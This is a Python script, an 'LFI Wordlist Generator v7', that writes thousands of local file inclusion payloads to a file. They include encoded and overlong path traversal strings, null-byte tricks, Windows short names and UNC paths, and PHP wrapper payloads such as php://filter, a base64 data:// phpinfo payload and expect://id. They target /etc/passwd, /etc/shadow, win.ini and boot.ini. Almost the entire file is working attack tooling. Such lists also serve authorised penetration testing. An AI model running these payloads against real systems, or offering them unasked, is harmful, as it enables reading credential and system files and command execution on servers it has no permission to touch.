#!/usr/bin/env python3
"""
LFI Wordlist Generator v7 (FINAL)
- Linux: /etc/passwd, /etc/shadow, /etc/hosts
- Windows: /boot.ini, /windows/win.ini
- Depth 1..N (default 10), all techniques
"""

import argparse
import sys

# ============ FILES (minimal set) ============

LINUX_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
]

WINDOWS_FILES = [
    "/boot.ini",
    "/windows/win.ini",
]

DEFAULT_DEPTH = 10

# ============ TRAVERSAL PREFIXES (complete) ============

PREFIXES = {
    # --- basic ---
    "basic":          "../",
    "basic_bs":       "..\\",
    "slash_mix_1":    "..\\/",
    "slash_mix_2":    "../\\",
    # --- URL encoded ---
    "url_enc":        "%2e%2e%2f",
    "url_enc_up":     "%2E%2E%2F",
    "mixed_1":        "..%2f",
    "mixed_1_up":     "..%2F",
    "mixed_2":        "%2e%2e/",
    "bs_enc":         "..%5c",
    "bs_enc_full":    "%2e%2e%5c",
    # --- multiple encoding ---
    "double_enc":     "%252e%252e%252f",
    "double_enc_bs":  "%252e%252e%255c",
    "mixed_double":   "..%252f",
    "triple_enc":     "%25252e%25252e%25252f",
    # --- unicode / overlong UTF-8 ---
    "unicode_1":      "..%c0%af",
    "unicode_2":      "..%c1%9c",
    "unicode_full":   "%c0%ae%c0%ae%c0%af",
    "overlong_3":     "%e0%80%ae/",
    "utf16":          "%u002e%u002e%u2215",
    "utf16_bs":       "%u002e%u002e%u005c",
    "fullwidth_u":    "%uff0e%uff0e%uff0f",
    "fullwidth_utf8": "%ef%bc%8e%ef%bc%8e%ef%bc%8f",
    # --- parser tricks ---
    "semicolon":      "..;/",
    "semicolon_enc":  "..%3b/",
    "html_entity":    "&#46;&#46;/",
}

# ============ PROMPTS ============

def ask_depth():
    while True:
        raw = input(f"Enter traversal depth [1-N] (default {DEFAULT_DEPTH}): ").strip()
        if raw == "":
            print(f"[*] Using default depth: {DEFAULT_DEPTH}")
            return DEFAULT_DEPTH
        if not raw.isdigit():
            print(f"[!] '{raw}' is not a valid number. Try again or press Enter.")
            continue
        depth = int(raw)
        if depth < 1:
            print("[!] Depth must be at least 1.")
            continue
        if depth > 50:
            confirm = input(f"[!] Depth {depth} = HUGE list. Continue? [y/N]: ").strip().lower()
            if confirm not in ("y", "yes"):
                continue
        return depth


def ask_os():
    aliases = {"l": "linux", "linux": "linux",
               "w": "windows", "windows": "windows",
               "b": "both", "both": "both"}
    while True:
        raw = input("Target OS [linux/windows/both] (default both): ").strip().lower()
        if raw == "":
            return "both"
        if raw in aliases:
            return aliases[raw]
        print("[!] Invalid choice.")


def ask_direct():
    raw = input("Direct mode only (absolute paths, no traversal)? [y/N]: ").strip().lower()
    return raw in ("y", "yes")


# ============ GENERATOR ============

def generate_wordlist(depth, os_filter, direct_only):
    payloads = set()

    lin_files = [f.lstrip("/") for f in LINUX_FILES] if os_filter in ("linux", "both") else []
    lin_abs   = LINUX_FILES if os_filter in ("linux", "both") else []
    win_files = [f.lstrip("/") for f in WINDOWS_FILES] if os_filter in ("windows", "both") else []
    win_abs   = WINDOWS_FILES if os_filter in ("windows", "both") else []
    win_bs    = [f.replace("/", "\\") for f in win_files]   # backslash versions

    # ---- ABSOLUTE PATHS (always) ----
    for f in lin_abs + win_abs:
        payloads.add(f)
        payloads.add(f.replace("/", "\\"))

    # ---- Windows drive-letter absolutes ----
    for f in win_files:
        payloads.add("C:/" + f)
        payloads.add("c:/" + f)
        payloads.add("C:\\" + f.replace("/", "\\"))

    if direct_only:
        for f in lin_files:
            payloads.add("//" + f)
            payloads.add("///" + f)
        payloads.update([
            "/etc//passwd", "/etc/./passwd", "/etc/passwd/",
            "%65%74%63/%70%61%73%73%77%64",
            "/WINDOWS/win.ini", "/Windows/Win.INI", "/Boot.ini",
            "/boot.ini.", "/boot.ini%20", "/boot.ini...",
            "/windows/win.ini.", "/windows/win.ini%20",
            "file:///etc/passwd", "file:///C:/windows/win.ini",
        ])
        return sorted(payloads)

    # ---- 1. ALL PREFIXES x DEPTHS 1..N x FILES ----
    for prefix in PREFIXES.values():
        for d in range(1, depth + 1):
            trav = prefix * d
            for f in lin_files:
                payloads.add(trav + f)
            for f in win_files:
                payloads.add(trav + f)

    # ---- 2. BACKSLASH FILE PATHS (Windows) ----
    for d in range(1, depth + 1):
        trav_bs  = "..\\" * d
        trav_mix = "..\\/" * d
        for f in win_bs:
            payloads.add(trav_bs + f)
            payloads.add(trav_mix + f)

    # ---- 3. EXTRA SLASHES / NORMALIZATION ----
    for f in lin_files:
        payloads.add("//" + f)
        payloads.add("///" + f)
    for d in range(1, depth + 1):
        trav    = "....//" * d
        trav_bs = "....\\\\" * d
        for f in lin_files:
            payloads.add(trav + f)
            payloads.add(trav_bs + "etc\\passwd")
        for f in win_files:
            payloads.add(trav + f)
        payloads.add("....\\/" * d + "etc/passwd")
        payloads.add("....\\/" * d + "windows/win.ini")

    # ---- 4. NULL BYTE VARIANTS ----
    for d in range(1, depth + 1):
        trav     = "../" * d
        trav_enc = "..%2f" * d
        payloads.add(trav + "etc/passwd%00")
        payloads.add(trav + "etc/passwd%00.php")
        payloads.add(trav + "etc/passwd%00.txt")
        payloads.add(trav + "etc/shadow%00")
        payloads.add(trav + "etc/hosts%00")
        payloads.add(trav + "windows/win.ini%00")
        payloads.add(trav + "boot.ini%00")
        payloads.add(trav_enc + "etc/passwd%00")
        payloads.add(trav_enc + "boot.ini%00")
        # double-encoded null
        payloads.add(trav + "etc/passwd%2500")
        # Java overlong null
        payloads.add(trav + "etc/passwd%c0%80")
        payloads.add("/etc/passwd%c0%80")

    # ---- 5. FILE SELF-OBFUSCATION ----
    payloads.update([
        "/etc//passwd", "/etc/./passwd", "/etc/passwd/",
        "/etc//shadow", "/etc/./shadow",
        "/etc//hosts",  "/etc/./hosts",
        "%65%74%63/%70%61%73%73%77%64",          # fully URL-encoded file
        "/etc/%70%61%73%73%77%64",               # partially encoded
    ])
    for d in range(1, depth + 1):
        payloads.add("../" * d + "etc//passwd")
        payloads.add("../" * d + "etc/./passwd")
        payloads.add("../" * d + "etc//shadow")
        payloads.add("../" * d + "etc//hosts")

    # ---- 6. WINDOWS 8.3 SHORT NAMES ----
    short_files = [
        "WINDOWS~1/win.ini",
        "WINDOWS~1/WIN.INI",
    ]
    for d in range(1, depth + 1):
        for f in short_files:
            payloads.add("../" * d + f)
    payloads.update(short_files)

    # ---- 7. WINDOWS CASE + TRAILING DOT/SPACE ----
    payloads.update([
        "/WINDOWS/win.ini", "/Windows/Win.INI", "/Boot.ini", "/BOOT.INI",
        "/boot.ini.", "/boot.ini%20", "/boot.ini...",
        "/windows/win.ini.", "/windows/win.ini%20",
    ])

    # ---- 8. UNC PATHS ----
    payloads.update([
        "\\\\127.0.0.1\\c$\\windows\\win.ini",
        "\\\\localhost\\c$\\boot.ini",
    ])

    # ---- 9. PHP WRAPPERS ----
    payloads.update([
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=" + "../" * depth + "etc/passwd",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/zlib.deflate/resource=index.php",
        "php://filter/read=convert.iconv.utf-8.utf-16/resource=index.php",
        "php://input", "php://stdout", "php://stderr",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id", "expect://whoami",
        "file:///etc/passwd", "file:///C:/windows/win.ini",
        "compress.zlib://index.php",
        "http://127.0.0.1/",
    ])

    return sorted(payloads)


# ============ MAIN ============

def main():
    parser = argparse.ArgumentParser(description="LFI Wordlist Generator v7")
    parser.add_argument("-d", "--depth", type=int, default=None)
    parser.add_argument("--os", choices=["linux", "windows", "both"], default=None)
    parser.add_argument("--direct", action="store_true")
    parser.add_argument("-o", "--output", default="lfi_wordlist.txt")
    parser.add_argument("-y", "--yes", action="store_true")
    args = parser.parse_args()

    print("=" * 50)
    print("       LFI Wordlist Generator v7")
    print("  Linux: passwd, shadow, hosts | Win: boot.ini, win.ini")
    print("=" * 50)

    if args.depth is not None:
        if args.depth < 1:
            parser.error("depth must be >= 1")
        depth = args.depth
        print(f"[*] Depth: 1 to {depth} (from CLI)")
    elif args.yes:
        depth = DEFAULT_DEPTH
        print(f"[*] Depth: 1 to {depth} (default)")
    else:
        depth = ask_depth()

    if args.os is not None:
        os_filter = args.os
    elif args.yes:
        os_filter = "both"
    else:
        os_filter = ask_os()

    if args.direct:
        direct_only = True
    elif args.yes:
        direct_only = False
    else:
        direct_only = ask_direct()

    print("-" * 50)

    payloads = generate_wordlist(depth, os_filter, direct_only)

    with open(args.output, "w") as f:
        f.write("\n".join(payloads))

    print(f"[*] Depth      : 1 to {depth} (every step)")
    print(f"[*] OS         : {os_filter}")
    print(f"[*] Mode       : {'DIRECT' if direct_only else 'FULL'}")
    print(f"[*] Files      : Linux=3 (passwd/shadow/hosts), Windows=2 (boot.ini/win.ini)")
    print(f"[*] Generated  : {len(payloads)} payloads")
    print(f"[*] Saved to   : {args.output}")
    print("=" * 50)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Cancelled by user.")
        sys.exit(1)
